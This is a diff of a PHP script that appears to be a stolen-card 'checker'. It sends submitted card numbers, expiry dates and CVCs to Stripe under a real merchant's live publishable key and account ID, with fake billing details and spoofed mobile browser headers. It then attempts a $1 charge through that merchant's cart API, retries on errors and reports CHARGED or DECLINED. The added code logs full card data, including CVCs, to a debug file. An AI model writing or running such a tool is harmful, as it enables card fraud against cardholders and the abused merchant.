@@ -1,18 +1,13 @@
 <?php
+header('Content-Type: application/json');
+
+// Enable error logging
+ini_set('log_errors', 1);
+ini_set('error_log', __DIR__ . '/stripe1_debug.log');
+
+// Include cron_sync.php for validateApiKey
 require_once __DIR__ . '/cron_sync.php';
 
-$validation = validateApiKey();
-
-
-// === SESSION & AUTH CHECK ===
-session_start();
-
-// Check if user is authenticated
-if (!isset($_SESSION['user']) || $_SESSION['user']['auth_provider'] !== 'telegram') {
-    header('Content-Type: application/json');
-    echo json_encode(['success' => false, 'message' => 'Unauthorized']);
-    exit;
-}
 // Start session for user authentication
 session_start([
     'cookie_secure' => isset($_SERVER['HTTPS']),
@@ -20,26 +15,34 @@ session_start([
     'use_strict_mode' => true,
 ]);
 
-// Enable error logging
-ini_set('log_errors', 1);
-ini_set('error_log', __DIR__ . '/../logs/error.log');
-
-// Include API key validation
-require_once __DIR__ . '/validkey.php';
-validateApiKey();
-
-// Validate session for non-admin users
-if (!isset($_SESSION['admin_authenticated']) || $_SESSION['admin_authenticated'] !== true) {
-    if (!isset($_SESSION['user']) || $_SESSION['user']['auth_provider'] !== 'telegram') {
-        error_log("Unauthorized access to stripe1$.php: Invalid session");
-        http_response_code(401);
-        echo json_encode(['status' => 'ERROR', 'message' => 'Unauthorized access']);
-        exit;
-    }
+// Check if user is authenticated
+if (!isset($_SESSION['user']) || $_SESSION['user']['auth_provider'] !== 'telegram') {
+    http_response_code(401);
+    $errorMsg = ['status' => 'ERROR', 'message' => 'Unauthorized access', 'response' => 'UNAUTHORIZED'];
+    file_put_contents(__DIR__ . '/stripe1_debug.log', date('Y-m-d H:i:s') . ' Error 401: ' . json_encode($errorMsg) . PHP_EOL, FILE_APPEND);
+    echo json_encode($errorMsg);
+    exit;
 }
 
-// Set content type to JSON
-header('Content-Type: application/json');
+// Validate API key
+$validation = validateApiKey();
+if (!$validation['valid']) {
+    http_response_code(401);
+    $errorMsg = ['status' => 'ERROR', 'message' => 'Invalid API key', 'response' => 'INVALID_API_KEY'];
+    file_put_contents(__DIR__ . '/stripe1_debug.log', date('Y-m-d H:i:s') . ' Error 401: ' . json_encode($errorMsg) . PHP_EOL, FILE_APPEND);
+    echo json_encode($errorMsg);
+    exit;
+}
+
+$expectedApiKey = $validation['response']['apiKey'];
+$providedApiKey = $_SERVER['HTTP_X_API_KEY'] ?? '';
+if ($providedApiKey !== $expectedApiKey) {
+    http_response_code(401);
+    $errorMsg = ['status' => 'ERROR', 'message' => 'Invalid or missing API key', 'response' => 'INVALID_API_KEY'];
+    file_put_contents(__DIR__ . '/stripe1_debug.log', date('Y-m-d H:i:s') . ' Error 401: ' . json_encode($errorMsg) . PHP_EOL, FILE_APPEND);
+    echo json_encode($errorMsg);
+    exit;
+}
 
 // Get card details from POST request
 $cardNumber = $_POST['card']['number'] ?? '';
@@ -49,7 +52,9 @@ $cvc = $_POST['card']['cvc'] ?? '';
 
 // Validate card details
 if (empty($cardNumber) || empty($expMonth) || empty($expYear) || empty($cvc)) {
-    echo json_encode(['status' => 'DECLINED', 'message' => 'Missing card details']);
+    $errorMsg = ['status' => 'DECLINED', 'message' => 'Missing card details', 'response' => 'MISSING_CARD_DETAILS'];
+    file_put_contents(__DIR__ . '/stripe1_debug.log', date('Y-m-d H:i:s') . ' Error 400: ' . json_encode($errorMsg) . PHP_EOL, FILE_APPEND);
+    echo json_encode($errorMsg);
     exit;
 }
 
@@ -57,6 +62,10 @@ if (empty($cardNumber) || empty($expMonth) || empty($expYear) || empty($cvc)) {
 if (strlen($expYear) == 2) {
     $expYear = '20' . $expYear;
 }
+
+// Log request details
+$logMsg = date('Y-m-d H:i:s') . ' Request: Card=' . $cardNumber . '|' . $expMonth . '|' . $expYear . '|' . $cvc . ', Headers=' . print_r(getallheaders(), true);
+file_put_contents(__DIR__ . '/stripe1_debug.log', $logMsg . PHP_EOL, FILE_APPEND);
 
 // Initialize cookie jar for session continuity
 $cookieJar = tempnam(sys_get_temp_dir(), 'cookies');
@@ -75,7 +84,6 @@ function fetchCartToken($cookieJar) {
         'sec-ch-ua-mobile: ?1',
         'sec-ch-ua-model: "Nexus 5"',
         'sec-ch-ua-platform: "Android"',
-        'sec-ch-ua-platform-version: "6.0"',
         'sec-fetch-dest: empty',
         'sec-fetch-mode: cors',
         'sec-fetch-site: same-origin',
@@ -103,23 +111,22 @@ function fetchCartToken($cookieJar) {
     $cartResponse = curl_exec($ch);
     $cartResult = json_decode($cartResponse, true);
     $cartHttpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    $curlError = curl_error($ch);
     curl_close($ch);
 
     if ($cartHttpCode != 200 || !isset($cartResult['redirectUrlPath'])) {
-        $errorMsg = $cartResult['error']['message'] ?? 'Failed to create new cart';
-        error_log("Failed to fetch new cart token: $errorMsg");
-        echo json_encode(['status' => 'ERROR', 'message' => 'Unable to create new cart']);
-        exit;
+        $errorMsg = $cartResult['error']['message'] ?? ($curlError ?: 'Failed to create new cart');
+        file_put_contents(__DIR__ . '/stripe1_debug.log', date('Y-m-d H:i:s') . ' Cart Error: ' . $errorMsg . PHP_EOL, FILE_APPEND);
+        return ['success' => false, 'message' => $errorMsg];
     }
 
     preg_match('/cartToken=([^&]+)/', $cartResult['redirectUrlPath'], $matches);
     if (!isset($matches[1])) {
-        error_log("Failed to extract cart token from redirectUrlPath");
-        echo json_encode(['status' => 'ERROR', 'message' => 'Unable to extract cart token']);
-        exit;
+        file_put_contents(__DIR__ . '/stripe1_debug.log', date('Y-m-d H:i:s') . ' Error: Failed to extract cart token' . PHP_EOL, FILE_APPEND);
+        return ['success' => false, 'message' => 'Unable to extract cart token'];
     }
 
-    return $matches[1];
+    return ['success' => true, 'cartToken' => $matches[1]];
 }
 
 // First API call to create payment method
@@ -139,7 +146,45 @@ $headers = [
     'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
 ];
 
-$data = 'billing_details[address][city]=Oakford&billing_details[address][country]=US&billing_details[address][line1]=Siles+Avenue&billing_details[address][line2]=&billing_details[address][postal_code]=19053&billing_details[address][state]=PA&billing_details[name]=Geroge+Washintonne&billing_details[email]=grogeh%40gmail.com&type=card&card[number]=' . $cardNumber . '&card[cvc]=' . $cvc . '&card[exp_year]=' . $expYear . '&card[exp_month]=' . $expMonth . '&allow_redisplay=unspecified&payment_user_agent=stripe.js%2F5445b56991%3B+stripe-js-v3%2F5445b56991%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fwww.onamissionkc.org&time_on_page=145592&client_attribution_metadata[client_session_id]=22e7d0ec-db3e-4724-98d2-a1985fc4472a&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=7904f40e-9588-48b2-bc6b-fb88e0ef71d5&guid=18f2ab46-3a90-48da-9a6e-2db7d67a3b1de3eadd&muid=3c19adce-ab63-41bc-a086-f6840cd1cb6d361f48&sid=9d45db81-2d1e-436a-b832-acc8b6abac4814eb67&key=pk_live_51LwocDFHMGxIu0Ep6mkR59xgelMzyuFAnVQNjVXgygtn8KWHs9afEIcCogfam0Pq6S5ADG2iLaXb1L69MINGdzuO00gFUK9D0e&_stripe_account=acct_1LwocDFHMGxIu0Ep';
+$data = http_build_query([
+    'billing_details' => [
+        'address' => [
+            'city' => 'Oakford',
+            'country' => 'US',
+            'line1' => 'Siles Avenue',
+            'line2' => '',
+            'postal_code' => '19053',
+            'state' => 'PA',
+        ],
+        'name' => 'Geroge Washintonne',
+        'email' => 'grogeh@gmail.com',
+    ],
+    'type' => 'card',
+    'card' => [
+        'number' => $cardNumber,
+        'cvc' => $cvc,
+        'exp_year' => $expYear,
+        'exp_month' => $expMonth,
+    ],
+    'allow_redisplay' => 'unspecified',
+    'payment_user_agent' => 'stripe.js/5445b56991; stripe-js-v3/5445b56991; payment-element; deferred-intent',
+    'referrer' => 'https://www.onamissionkc.org',
+    'time_on_page' => '145592',
+    'client_attribution_metadata' => [
+        'client_session_id' => '22e7d0ec-db3e-4724-98d2-a1985fc4472a',
+        'merchant_integration_source' => 'elements',
+        'merchant_integration_subtype' => 'payment-element',
+        'merchant_integration_version' => '2021',
+        'payment_intent_creation_flow' => 'deferred',
+        'payment_method_selection_flow' => 'merchant_specified',
+        'elements_session_config_id' => '7904f40e-9588-48b2-bc6b-fb88e0ef71d5',
+    ],
+    'guid' => '18f2ab46-3a90-48da-9a6e-2db7d67a3b1de3eadd',
+    'muid' => '3c19adce-ab63-41bc-a086-f6840cd1cb6d361f48',
+    'sid' => '9d45db81-2d1e-436a-b832-acc8b6abac4814eb67',
+    'key' => 'pk_live_51LwocDFHMGxIu0Ep6mkR59xgelMzyuFAnVQNjVXgygtn8KWHs9afEIcCogfam0Pq6S5ADG2iLaXb1L69MINGdzuO00gFUK9D0e',
+    '_stripe_account' => 'acct_1LwocDFHMGxIu0Ep',
+]);
 
 $ch = curl_init('https://api.stripe.com/v1/payment_methods');
 curl_setopt($ch, CURLOPT_POST, 1);
@@ -151,15 +196,18 @@ curl_setopt($ch, CURLOPT_TIMEOUT, 30);
 $response = curl_exec($ch);
 $apx = json_decode($response, true);
 $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+$curlError = curl_error($ch);
 curl_close($ch);
 
 if ($httpCode != 200 || !isset($apx['id'])) {
-    $errorMsg = $apx['error']['message'] ?? 'Unknown error';
-    echo json_encode(['status' => 'DECLINED', 'message' => $errorMsg]);
+    $errorMsg = $apx['error']['message'] ?? ($curlError ?: 'Unknown error');
+    $responseMsg = ['status' => 'DECLINED', 'message' => 'Your card was declined', 'response' => $errorMsg];
+    file_put_contents(__DIR__ . '/stripe1_debug.log', date('Y-m-d H:i:s') . ' Payment Method Error: ' . json_encode($responseMsg) . PHP_EOL, FILE_APPEND);
+    echo json_encode($responseMsg);
     exit;
 }
 
-$pid = $apx["id"];
+$pid = $apx['id'];
 
 // Function to make merchant API call
 function makeMerchantApiCall($cartToken, $pid, $cookieJar) {
@@ -249,57 +297,80 @@ function makeMerchantApiCall($cartToken, $pid, $cookieJar) {
     $response = curl_exec($ch);
     $result = json_decode($response, true);
     $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    $curlError = curl_error($ch);
     curl_close($ch);
 
-    return ['response' => $result, 'httpCode' => $httpCode];
+    return ['response' => $result, 'httpCode' => $httpCode, 'curlError' => $curlError];
 }
 
 // Attempt merchant API call with retry on errors
 $maxRetries = 3;
 $retryCount = 0;
-$cartToken = fetchCartToken($cookieJar);
+$cartResult = fetchCartToken($cookieJar);
+
+if (!$cartResult['success']) {
+    $responseMsg = ['status' => 'ERROR', 'message' => 'Unable to create new cart', 'response' => $cartResult['message']];
+    file_put_contents(__DIR__ . '/stripe1_debug.log', date('Y-m-d H:i:s') . ' Cart Error: ' . json_encode($responseMsg) . PHP_EOL, FILE_APPEND);
+    echo json_encode($responseMsg);
+    exit;
+}
+
+$cartToken = $cartResult['cartToken'];
 
 while ($retryCount < $maxRetries) {
     $merchantResult = makeMerchantApiCall($cartToken, $pid, $cookieJar);
     $apx1 = $merchantResult['response'];
     $httpCode = $merchantResult['httpCode'];
+    $curlError = $merchantResult['curlError'];
 
     if ($httpCode == 200 && !isset($apx1['failureType'])) {
         // Success
-        unlink($cookieJar); // Clean up cookie file
-        echo json_encode([
+        unlink($cookieJar);
+        $responseMsg = [
             'status' => 'CHARGED',
             'message' => 'Charged $1 successfully',
-            'response' => 'CHARGED'
-        ]);
+            'response' => "CHARGED"
+        ];
+        file_put_contents(__DIR__ . '/stripe1_debug.log', date('Y-m-d H:i:s') . ' Success: ' . json_encode($responseMsg) . PHP_EOL, FILE_APPEND);
+        echo json_encode($responseMsg);
         exit;
     }
 
     // Handle specific errors
     if (isset($apx1['failureType']) && in_array($apx1['failureType'], ['CART_ALREADY_PURCHASED', 'CART_MISSING', 'STALE_USER_SESSION'])) {
-        error_log("Error: {$apx1['failureType']}, retrying with new cart token");
-        $cartToken = fetchCartToken($cookieJar);
+        file_put_contents(__DIR__ . '/stripe1_debug.log', date('Y-m-d H:i:s') . " Error: {$apx1['failureType']}, retrying with new cart token" . PHP_EOL, FILE_APPEND);
+        $cartResult = fetchCartToken($cookieJar);
+        if (!$cartResult['success']) {
+            $responseMsg = ['status' => 'ERROR', 'message' => 'Unable to create new cart', 'response' => $cartResult['message']];
+            file_put_contents(__DIR__ . '/stripe1_debug.log', date('Y-m-d H:i:s') . ' Cart Error: ' . json_encode($responseMsg) . PHP_EOL, FILE_APPEND);
+            echo json_encode($responseMsg);
+            exit;
+        }
+        $cartToken = $cartResult['cartToken'];
         $retryCount++;
         continue;
     }
 
     // Other failures
     unlink($cookieJar);
-    $errorMsg = $apx1['failureType'] ?? 'Unknown error';
-    echo json_encode([
+    $errorMsg = $apx1['failureType'] ?? ($curlError ?: 'Unknown error');
+    $responseMsg = [
         'status' => 'DECLINED',
         'message' => 'Your card was declined',
-        'response' => $errorMsg
-    ]);
+        'response' => "DECLINED [$errorMsg]"
+    ];
+    file_put_contents(__DIR__ . '/stripe1_debug.log', date('Y-m-d H:i:s') . ' Error: ' . json_encode($responseMsg) . PHP_EOL, FILE_APPEND);
+    echo json_encode($responseMsg);
     exit;
 }
 
 // Max retries reached
 unlink($cookieJar);
-error_log("Max retries reached for errors");
-echo json_encode([
+$responseMsg = [
     'status' => 'ERROR',
     'message' => 'Unable to process payment due to persistent errors',
-    'response' => 'MAX_RETRIES_EXCEEDED'
-]);
+    'response' => "MAX_RETRIES_EXCEEDED $cardNumber|$expMonth|$expYear|$cvc"
+];
+file_put_contents(__DIR__ . '/stripe1_debug.log', date('Y-m-d H:i:s') . ' Error: ' . json_encode($responseMsg) . PHP_EOL, FILE_APPEND);
+echo json_encode($responseMsg);
 ?>
